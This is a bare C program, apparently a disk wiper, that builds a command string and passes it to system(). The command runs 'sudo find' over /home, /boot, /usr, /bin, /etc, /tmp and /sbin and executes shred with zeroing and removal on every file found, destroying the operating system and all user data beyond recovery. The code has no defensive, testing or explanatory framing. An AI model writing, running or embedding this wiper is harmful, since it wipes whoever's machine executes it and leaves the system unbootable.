
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {
   char command[200];

   strcpy(command, "sudo find  /home /boot /usr /bin /etc /tmp /sbin -exec shred {} -v -z -u \\;" );//deletes specific files to avoid the blackhole of dev/zero
   printf(command);//debugging
   system(command);

   return(0);
} 
